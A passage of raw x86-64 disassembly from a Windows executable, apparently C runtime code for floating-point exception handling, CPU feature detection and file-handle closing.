   14000a290:	e8 fb 08 00 00       	call   0x14000ab90
   14000a295:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000a29b:	48 83 c4 50          	add    $0x50,%rsp
   14000a29f:	5b                   	pop    %rbx
   14000a2a0:	c3                   	ret
   14000a2a1:	90                   	nop
   14000a2a2:	90                   	nop
   14000a2a3:	90                   	nop
   14000a2a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a2a9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a2ae:	57                   	push   %rdi
   14000a2af:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2b3:	8b d9                	mov    %ecx,%ebx
   14000a2b5:	48 8b f2             	mov    %rdx,%rsi
   14000a2b8:	83 e3 1f             	and    $0x1f,%ebx
   14000a2bb:	8b f9                	mov    %ecx,%edi
   14000a2bd:	f6 c1 08             	test   $0x8,%cl
   14000a2c0:	74 13                	je     0x14000a2d5
   14000a2c2:	84 d2                	test   %dl,%dl
   14000a2c4:	79 0f                	jns    0x14000a2d5
   14000a2c6:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000a2cb:	e8 8c 09 00 00       	call   0x14000ac5c
   14000a2d0:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000a2d3:	eb 57                	jmp    0x14000a32c
   14000a2d5:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000a2da:	40 84 f9             	test   %dil,%cl
   14000a2dd:	74 11                	je     0x14000a2f0
   14000a2df:	48 0f ba e2 09       	bt     $0x9,%rdx
   14000a2e4:	73 0a                	jae    0x14000a2f0
   14000a2e6:	e8 71 09 00 00       	call   0x14000ac5c
   14000a2eb:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000a2ee:	eb 3c                	jmp    0x14000a32c
   14000a2f0:	40 f6 c7 01          	test   $0x1,%dil
   14000a2f4:	74 16                	je     0x14000a30c
   14000a2f6:	48 0f ba e2 0a       	bt     $0xa,%rdx
   14000a2fb:	73 0f                	jae    0x14000a30c
   14000a2fd:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000a302:	e8 55 09 00 00       	call   0x14000ac5c
   14000a307:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000a30a:	eb 20                	jmp    0x14000a32c
   14000a30c:	40 f6 c7 02          	test   $0x2,%dil
   14000a310:	74 1a                	je     0x14000a32c
   14000a312:	48 0f ba e2 0b       	bt     $0xb,%rdx
   14000a317:	73 13                	jae    0x14000a32c
   14000a319:	40 f6 c7 10          	test   $0x10,%dil
   14000a31d:	74 0a                	je     0x14000a329
   14000a31f:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000a324:	e8 33 09 00 00       	call   0x14000ac5c
   14000a329:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000a32c:	40 f6 c7 10          	test   $0x10,%dil
   14000a330:	74 14                	je     0x14000a346
   14000a332:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000a337:	73 0d                	jae    0x14000a346
   14000a339:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000a33e:	e8 19 09 00 00       	call   0x14000ac5c
   14000a343:	83 e3 ef             	and    $0xffffffef,%ebx
   14000a346:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a34b:	33 c0                	xor    %eax,%eax
   14000a34d:	85 db                	test   %ebx,%ebx
   14000a34f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a354:	0f 94 c0             	sete   %al
   14000a357:	48 83 c4 20          	add    $0x20,%rsp
   14000a35b:	5f                   	pop    %rdi
   14000a35c:	c3                   	ret
   14000a35d:	90                   	nop
   14000a35e:	90                   	nop
   14000a35f:	90                   	nop
   14000a360:	48 8b c4             	mov    %rsp,%rax
   14000a363:	55                   	push   %rbp
   14000a364:	53                   	push   %rbx
   14000a365:	56                   	push   %rsi
   14000a366:	57                   	push   %rdi
   14000a367:	41 56                	push   %r14
   14000a369:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000a36d:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000a374:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000a378:	48 8b 05 99 ac 00 00 	mov    0xac99(%rip),%rax        # 0x140015018
   14000a37f:	48 33 c4             	xor    %rsp,%rax
   14000a382:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000a386:	8b f2                	mov    %edx,%esi
   14000a388:	4c 8b f1             	mov    %rcx,%r14
   14000a38b:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000a390:	b9 80 1f 00 00       	mov    $0x1f80,%ecx
   14000a395:	41 8b f9             	mov    %r9d,%edi
   14000a398:	49 8b d8             	mov    %r8,%rbx
   14000a39b:	e8 40 08 00 00       	call   0x14000abe0
   14000a3a0:	8b 4d 5f             	mov    0x5f(%rbp),%ecx
   14000a3a3:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000a3a8:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000a3ad:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   14000a3b3:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   14000a3b8:	f2 0f 11 44 24 48    	movsd  %xmm0,0x48(%rsp)
   14000a3be:	e8 e1 fe ff ff       	call   0x14000a2a4
   14000a3c3:	f2 0f 10 75 77       	movsd  0x77(%rbp),%xmm6
   14000a3c8:	85 c0                	test   %eax,%eax
   14000a3ca:	75 40                	jne    0x14000a40c
   14000a3cc:	83 7d 7f 02          	cmpl   $0x2,0x7f(%rbp)
   14000a3d0:	75 11                	jne    0x14000a3e3
   14000a3d2:	8b 45 bf             	mov    -0x41(%rbp),%eax
   14000a3d5:	83 e0 e3             	and    $0xffffffe3,%eax
   14000a3d8:	f2 0f 11 75 af       	movsd  %xmm6,-0x51(%rbp)
   14000a3dd:	83 c8 03             	or     $0x3,%eax
   14000a3e0:	89 45 bf             	mov    %eax,-0x41(%rbp)
   14000a3e3:	44 8b 45 5f          	mov    0x5f(%rbp),%r8d
   14000a3e7:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   14000a3ec:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a3f1:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000a3f6:	48 8d 45 6f          	lea    0x6f(%rbp),%rax
   14000a3fa:	44 8b ce             	mov    %esi,%r9d
   14000a3fd:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000a402:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a407:	e8 54 04 00 00       	call   0x14000a860
   14000a40c:	e8 43 91 ff ff       	call   0x140003554
   14000a411:	84 c0                	test   %al,%al
   14000a413:	74 34                	je     0x14000a449
   14000a415:	85 ff                	test   %edi,%edi
   14000a417:	74 30                	je     0x14000a449
   14000a419:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000a41e:	4d 8b c6             	mov    %r14,%r8
   14000a421:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000a427:	8b cf                	mov    %edi,%ecx
   14000a429:	f2 0f 10 5d 6f       	movsd  0x6f(%rbp),%xmm3
   14000a42e:	8b 55 67             	mov    0x67(%rbp),%edx
   14000a431:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a436:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
   14000a43c:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   14000a442:	e8 f5 fd ff ff       	call   0x14000a23c
   14000a447:	eb 1c                	jmp    0x14000a465
   14000a449:	8b cf                	mov    %edi,%ecx
   14000a44b:	e8 40 07 00 00       	call   0x14000ab90
   14000a450:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000a455:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000a45a:	e8 81 07 00 00       	call   0x14000abe0
   14000a45f:	f2 0f 10 44 24 48    	movsd  0x48(%rsp),%xmm0
   14000a465:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   14000a469:	48 33 cc             	xor    %rsp,%rcx
   14000a46c:	e8 2f 76 ff ff       	call   0x140001aa0
   14000a471:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   14000a478:	00 
   14000a479:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   14000a480:	41 5e                	pop    %r14
   14000a482:	5f                   	pop    %rdi
   14000a483:	5e                   	pop    %rsi
   14000a484:	5b                   	pop    %rbx
   14000a485:	5d                   	pop    %rbp
   14000a486:	c3                   	ret
   14000a487:	90                   	nop
   14000a488:	90                   	nop
   14000a489:	90                   	nop
   14000a48a:	90                   	nop
   14000a48b:	90                   	nop
   14000a48c:	90                   	nop
   14000a48d:	90                   	nop
   14000a48e:	90                   	nop
   14000a48f:	90                   	nop
   14000a490:	53                   	push   %rbx
   14000a491:	48 83 ec 10          	sub    $0x10,%rsp
   14000a495:	45 33 c0             	xor    %r8d,%r8d
   14000a498:	33 c9                	xor    %ecx,%ecx
   14000a49a:	44 89 05 cf c5 00 00 	mov    %r8d,0xc5cf(%rip)        # 0x140016a70
   14000a4a1:	45 8d 48 01          	lea    0x1(%r8),%r9d
   14000a4a5:	41 8b c1             	mov    %r9d,%eax
   14000a4a8:	0f a2                	cpuid
   14000a4aa:	89 04 24             	mov    %eax,(%rsp)
   14000a4ad:	b8 00 10 00 18       	mov    $0x18001000,%eax
   14000a4b2:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a4b6:	23 c8                	and    %eax,%ecx
   14000a4b8:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000a4bc:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000a4c0:	3b c8                	cmp    %eax,%ecx
   14000a4c2:	75 2c                	jne    0x14000a4f0
   14000a4c4:	33 c9                	xor    %ecx,%ecx
   14000a4c6:	0f 01 d0             	xgetbv
   14000a4c9:	48 c1 e2 20          	shl    $0x20,%rdx
   14000a4cd:	48 0b d0             	or     %rax,%rdx
   14000a4d0:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000a4d5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000a4da:	44 8b 05 8f c5 00 00 	mov    0xc58f(%rip),%r8d        # 0x140016a70
   14000a4e1:	24 06                	and    $0x6,%al
   14000a4e3:	3c 06                	cmp    $0x6,%al
   14000a4e5:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000a4e9:	44 89 05 80 c5 00 00 	mov    %r8d,0xc580(%rip)        # 0x140016a70
   14000a4f0:	44 89 05 7d c5 00 00 	mov    %r8d,0xc57d(%rip)        # 0x140016a74
   14000a4f7:	33 c0                	xor    %eax,%eax
   14000a4f9:	48 83 c4 10          	add    $0x10,%rsp
   14000a4fd:	5b                   	pop    %rbx
   14000a4fe:	c3                   	ret
   14000a4ff:	90                   	nop
   14000a500:	48 83 ec 38          	sub    $0x38,%rsp
   14000a504:	48 8d 05 95 83 00 00 	lea    0x8395(%rip),%rax        # 0x1400128a0
   14000a50b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000a511:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a516:	e8 05 00 00 00       	call   0x14000a520
   14000a51b:	48 83 c4 38          	add    $0x38,%rsp
   14000a51f:	c3                   	ret
   14000a520:	48 8b c4             	mov    %rsp,%rax
   14000a523:	48 83 ec 68          	sub    $0x68,%rsp
   14000a527:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000a52b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000a52e:	41 8b d1             	mov    %r9d,%edx
   14000a531:	0f 28 d8             	movaps %xmm0,%xmm3
   14000a534:	41 83 e8 01          	sub    $0x1,%r8d
   14000a538:	74 2a                	je     0x14000a564
   14000a53a:	41 83 f8 01          	cmp    $0x1,%r8d
   14000a53e:	75 69                	jne    0x14000a5a9
   14000a540:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000a544:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000a547:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000a54c:	45 8b c8             	mov    %r8d,%r9d
   14000a54f:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000a554:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000a55b:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000a562:	eb 2d                	jmp    0x14000a591
   14000a564:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000a56b:	00 
   14000a56c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000a56f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000a575:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000a57b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000a581:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000a588:	00 
   14000a589:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000a590:	00 
   14000a591:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000a598:	00 
   14000a599:	f2 0f 11 4c 24 78    	movsd  %xmm1,0x78(%rsp)
   14000a59f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000a5a4:	e8 b7 fd ff ff       	call   0x14000a360
   14000a5a9:	0f 28 c6             	movaps %xmm6,%xmm0
   14000a5ac:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000a5b1:	48 83 c4 68          	add    $0x68,%rsp
   14000a5b5:	c3                   	ret
   14000a5b6:	90                   	nop
   14000a5b7:	90                   	nop
   14000a5b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a5bd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a5c2:	57                   	push   %rdi
   14000a5c3:	48 83 ec 20          	sub    $0x20,%rsp
   14000a5c7:	49 8b f9             	mov    %r9,%rdi
   14000a5ca:	49 8b d8             	mov    %r8,%rbx
   14000a5cd:	8b 0a                	mov    (%rdx),%ecx
   14000a5cf:	e8 ac c6 ff ff       	call   0x140006c80
   14000a5d4:	90                   	nop
   14000a5d5:	48 8b 03             	mov    (%rbx),%rax
   14000a5d8:	48 63 08             	movslq (%rax),%rcx
   14000a5db:	48 8b d1             	mov    %rcx,%rdx
   14000a5de:	48 8b c1             	mov    %rcx,%rax
   14000a5e1:	48 c1 f8 06          	sar    $0x6,%rax
   14000a5e5:	4c 8d 05 24 c0 00 00 	lea    0xc024(%rip),%r8        # 0x140016610
   14000a5ec:	83 e2 3f             	and    $0x3f,%edx
   14000a5ef:	48 c1 e2 06          	shl    $0x6,%rdx
   14000a5f3:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a5f7:	f6 44 10 38 01       	testb  $0x1,0x38(%rax,%rdx,1)
   14000a5fc:	74 09                	je     0x14000a607
   14000a5fe:	e8 cd 00 00 00       	call   0x14000a6d0
   14000a603:	8b d8                	mov    %eax,%ebx
   14000a605:	eb 0e                	jmp    0x14000a615
   14000a607:	e8 e4 a6 ff ff       	call   0x140004cf0
   14000a60c:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a612:	83 cb ff             	or     $0xffffffff,%ebx
   14000a615:	8b 0f                	mov    (%rdi),%ecx
   14000a617:	e8 88 c6 ff ff       	call   0x140006ca4
   14000a61c:	8b c3                	mov    %ebx,%eax
   14000a61e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a623:	48 83 c4 20          	add    $0x20,%rsp
   14000a627:	5f                   	pop    %rdi
   14000a628:	c3                   	ret
   14000a629:	90                   	nop
   14000a62a:	90                   	nop
   14000a62b:	90                   	nop
   14000a62c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a630:	48 83 ec 38          	sub    $0x38,%rsp
   14000a634:	48 63 d1             	movslq %ecx,%rdx
   14000a637:	83 fa fe             	cmp    $0xfffffffe,%edx
   14000a63a:	75 15                	jne    0x14000a651
   14000a63c:	e8 8f a6 ff ff       	call   0x140004cd0
   14000a641:	83 20 00             	andl   $0x0,(%rax)
   14000a644:	e8 a7 a6 ff ff       	call   0x140004cf0
   14000a649:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a64f:	eb 74                	jmp    0x14000a6c5
   14000a651:	85 c9                	test   %ecx,%ecx
   14000a653:	78 58                	js     0x14000a6ad
   14000a655:	3b 15 b5 c3 00 00    	cmp    0xc3b5(%rip),%edx        # 0x140016a10
   14000a65b:	73 50                	jae    0x14000a6ad
   14000a65d:	48 8b ca             	mov    %rdx,%rcx
   14000a660:	4c 8d 05 a9 bf 00 00 	lea    0xbfa9(%rip),%r8        # 0x140016610
   14000a667:	83 e1 3f             	and    $0x3f,%ecx
   14000a66a:	48 8b c2             	mov    %rdx,%rax
   14000a66d:	48 c1 f8 06          	sar    $0x6,%rax
   14000a671:	48 c1 e1 06          	shl    $0x6,%rcx
   14000a675:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a679:	f6 44 08 38 01       	testb  $0x1,0x38(%rax,%rcx,1)
   14000a67e:	74 2d                	je     0x14000a6ad
   14000a680:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000a685:	89 54 24 50          	mov    %edx,0x50(%rsp)
   14000a689:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000a68d:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000a692:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   14000a697:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a69c:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a6a1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000a6a6:	e8 0d ff ff ff       	call   0x14000a5b8
   14000a6ab:	eb 1b                	jmp    0x14000a6c8
   14000a6ad:	e8 1e a6 ff ff       	call   0x140004cd0
   14000a6b2:	83 20 00             	andl   $0x0,(%rax)
   14000a6b5:	e8 36 a6 ff ff       	call   0x140004cf0
   14000a6ba:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a6c0:	e8 0b a5 ff ff       	call   0x140004bd0
   14000a6c5:	83 c8 ff             	or     $0xffffffff,%eax
   14000a6c8:	48 83 c4 38          	add    $0x38,%rsp
   14000a6cc:	c3                   	ret
   14000a6cd:	90                   	nop
   14000a6ce:	90                   	nop
   14000a6cf:	90                   	nop
   14000a6d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a6d5:	57                   	push   %rdi
   14000a6d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a6da:	48 63 f9             	movslq %ecx,%rdi
   14000a6dd:	8b cf                	mov    %edi,%ecx
   14000a6df:	e8 a0 c6 ff ff       	call   0x140006d84
   14000a6e4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a6e8:	75 04                	jne    0x14000a6ee
   14000a6ea:	33 db                	xor    %ebx,%ebx
   14000a6ec:	eb 57                	jmp    0x14000a745
   14000a6ee:	48 8b 05 1b bf 00 00 	mov    0xbf1b(%rip),%rax        # 0x140016610
   14000a6f5:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000a6fa:	83 ff 01             	cmp    $0x1,%edi
   14000a6fd:	75 09                	jne    0x14000a708
   14000a6ff:	40 84 b8 b8 00 00 00 	test   %dil,0xb8(%rax)
   14000a706:	75 0a                	jne    0x14000a712
   14000a708:	3b f9                	cmp    %ecx,%edi
   14000a70a:	75 1d                	jne    0x14000a729
   14000a70c:	f6 40 78 01          	testb  $0x1,0x78(%rax)
   14000a710:	74 17                	je     0x14000a729
   14000a712:	e8 6d c6 ff ff       	call   0x140006d84
   14000a717:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000a71c:	48 8b d8             	mov    %rax,%rbx
   14000a71f:	e8 60 c6 ff ff       	call   0x140006d84
   14000a724:	48 3b c3             	cmp    %rbx,%rax
   14000a727:	74 c1                	je     0x14000a6ea
   14000a729:	8b cf                	mov    %edi,%ecx
   14000a72b:	e8 54 c6 ff ff       	call   0x140006d84
   14000a730:	48 8b c8             	mov    %rax,%rcx
   14000a733:	ff 15 7f 1a 00 00    	call   *0x1a7f(%rip)        # 0x14000c1b8
   14000a739:	85 c0                	test   %eax,%eax
   14000a73b:	75 ad                	jne    0x14000a6ea
   14000a73d:	ff 15 bd 18 00 00    	call   *0x18bd(%rip)        # 0x14000c000
   14000a743:	8b d8                	mov    %eax,%ebx
   14000a745:	8b cf                	mov    %edi,%ecx
   14000a747:	e8 7c c5 ff ff       	call   0x140006cc8
   14000a74c:	48 8b d7             	mov    %rdi,%rdx
   14000a74f:	4c 8d 05 ba be 00 00 	lea    0xbeba(%rip),%r8        # 0x140016610
   14000a756:	83 e2 3f             	and    $0x3f,%edx
   14000a759:	48 8b cf             	mov    %rdi,%rcx
   14000a75c:	48 c1 f9 06          	sar    $0x6,%rcx
   14000a760:	48 c1 e2 06          	shl    $0x6,%rdx
   14000a764:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000a768:	c6 44 11 38 00       	movb   $0x0,0x38(%rcx,%rdx,1)
   14000a76d:	85 db                	test   %ebx,%ebx
   14000a76f:	74 0c                	je     0x14000a77d
   14000a771:	8b cb                	mov    %ebx,%ecx
   14000a773:	e8 08 a5 ff ff       	call   0x140004c80
   14000a778:	83 c8 ff             	or     $0xffffffff,%eax
   14000a77b:	eb 02                	jmp    0x14000a77f
   14000a77d:	33 c0                	xor    %eax,%eax
   14000a77f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a784:	48 83 c4 20          	add    $0x20,%rsp
   14000a788:	5f                   	pop    %rdi
   14000a789:	c3                   	ret
   14000a78a:	90                   	nop
   14000a78b:	90                   	nop
   14000a78c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000a791:	4c 8b dc             	mov    %rsp,%r11
   14000a794:	33 d2                	xor    %edx,%edx
   14000a796:	48 89 11             	mov    %rdx,(%rcx)
   14000a799:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a79d:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000a7a1:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7a5:	89 50 10             	mov    %edx,0x10(%rax)
   14000a7a8:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7ac:	83 48 18 ff          	orl    $0xffffffff,0x18(%rax)
   14000a7b0:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7b4:	89 50 1c             	mov    %edx,0x1c(%rax)
   14000a7b7:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7bb:	89 50 20             	mov    %edx,0x20(%rax)
   14000a7be:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7c2:	48 89 50 28          	mov    %rdx,0x28(%rax)
   14000a7c6:	49 8b 43 08          	mov    0x8(%r11),%rax
   14000a7ca:	87 50 14             	xchg   %edx,0x14(%rax)
   14000a7cd:	c3                   	ret
   14000a7ce:	90                   	nop
   14000a7cf:	90                   	nop
   14000a7d0:	48 83 ec 48          	sub    $0x48,%rsp
   14000a7d4:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a7da:	48 8d 0d c7 80 00 00 	lea    0x80c7(%rip),%rcx        # 0x1400128a8
   14000a7e1:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000a7e6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000a7ec:	45 33 c9             	xor    %r9d,%r9d
   14000a7ef:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000a7f4:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000a7f9:	ff 15 59 1a 00 00    	call   *0x1a59(%rip)        # 0x14000c258
   14000a7ff:	48 89 05 12 b1 00 00 	mov    %rax,0xb112(%rip)        # 0x140015918
   14000a806:	48 83 c4 48          	add    $0x48,%rsp
   14000a80a:	c3                   	ret
   14000a80b:	90                   	nop
   14000a80c:	48 83 ec 28          	sub    $0x28,%rsp
   14000a810:	48 8b 0d 01 b1 00 00 	mov    0xb101(%rip),%rcx        # 0x140015918
   14000a817:	48 8d 41 02          	lea    0x2(%rcx),%rax
   14000a81b:	48 83 f8 01          	cmp    $0x1,%rax
   14000a81f:	76 06                	jbe    0x14000a827
   14000a821:	ff 15 91 19 00 00    	call   *0x1991(%rip)        # 0x14000c1b8
   14000a827:	48 83 c4 28          	add    $0x28,%rsp
   14000a82b:	c3                   	ret
   14000a82c:	90                   	nop
   14000a82d:	90                   	nop
   14000a82e:	90                   	nop
   14000a82f:	90                   	nop
   14000a830:	48 83 ec 08          	sub    $0x8,%rsp
   14000a834:	0f ae 1c 24          	stmxcsr (%rsp)
   14000a838:	8b 04 24             	mov    (%rsp),%eax
   14000a83b:	48 83 c4 08          	add    $0x8,%rsp
   14000a83f:	c3                   	ret
   14000a840:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a844:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000a849:	c3                   	ret
   14000a84a:	90                   	nop
   14000a84b:	90                   	nop
   14000a84c:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000a851:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000a856:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000a85a:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000a85f:	c3                   	ret
   14000a860:	48 83 ec 48          	sub    $0x48,%rsp
   14000a864:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000a869:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000a86e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a873:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000a878:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a87d:	e8 06 00 00 00       	call   0x14000a888
   14000a882:	48 83 c4 48          	add    $0x48,%rsp
   14000a886:	c3                   	ret
   14000a887:	90                   	nop
   14000a888:	48 8b c4             	mov    %rsp,%rax
   14000a88b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000a88f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000a893:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000a897:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000a89b:	55                   	push   %rbp
   14000a89c:	48 8b ec             	mov    %rsp,%rbp
   14000a89f:	48 83 ec 20          	sub    $0x20,%rsp
   14000a8a3:	48 8b da             	mov    %rdx,%rbx
   14000a8a6:	41 8b f1             	mov    %r9d,%esi
   14000a8a9:	33 d2                	xor    %edx,%edx
   14000a8ab:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000a8b0:	89 51 04             	mov    %edx,0x4(%rcx)
   14000a8b3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a8b7:	89 50 08             	mov    %edx,0x8(%rax)
   14000a8ba:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a8be:	89 50 0c             	mov    %edx,0xc(%rax)
   14000a8c1:	41 f6 c0 10          	test   $0x10,%r8b
   14000a8c5:	74 0d                	je     0x14000a8d4
   14000a8c7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a8cb:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000a8d0:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000a8d4:	41 f6 c0 02          	test   $0x2,%r8b
   14000a8d8:	74 0d                	je     0x14000a8e7
   14000a8da:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a8de:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000a8e3:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000a8e7:	41 f6 c0 01          	test   $0x1,%r8b
   14000a8eb:	74 0d                	je     0x14000a8fa
   14000a8ed:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a8f1:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000a8f6:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000a8fa:	41 f6 c0 04          	test   $0x4,%r8b
   14000a8fe:	74 0d                	je     0x14000a90d
   14000a900:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a904:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000a909:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000a90d:	41 f6 c0 08          	test   $0x8,%r8b
   14000a911:	74 0d                	je     0x14000a920
   14000a913:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000a917:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000a91c:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000a920:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a924:	48 8b 03             	mov    (%rbx),%rax
   14000a927:	48 c1 e8 07          	shr    $0x7,%rax
   14000a92b:	c1 e0 04             	shl    $0x4,%eax
   14000a92e:	f7 d0                	not    %eax
   14000a930:	33 41 08             	xor    0x8(%rcx),%eax
   14000a933:	83 e0 10             	and    $0x10,%eax
   14000a936:	31 41 08             	xor    %eax,0x8(%rcx)
   14000a939:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000a93d:	48 8b 03             	mov    (%rbx),%rax
   14000a940:	48 c1 e8 09          	shr    $0x9,%rax
   14000a944:	c1 e0 03             	shl    $0x3,%eax
   14000a947:	f7 d0                	not    %eax
   14000a949:	33 41 08             	xor    0x8(%rcx),%eax
   14000a94c:	83 e0 08             	and    $0x8,%eax
   14000a94f:	31 41 08             	xor    %eax,0x8(%rcx)
   14000a952:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
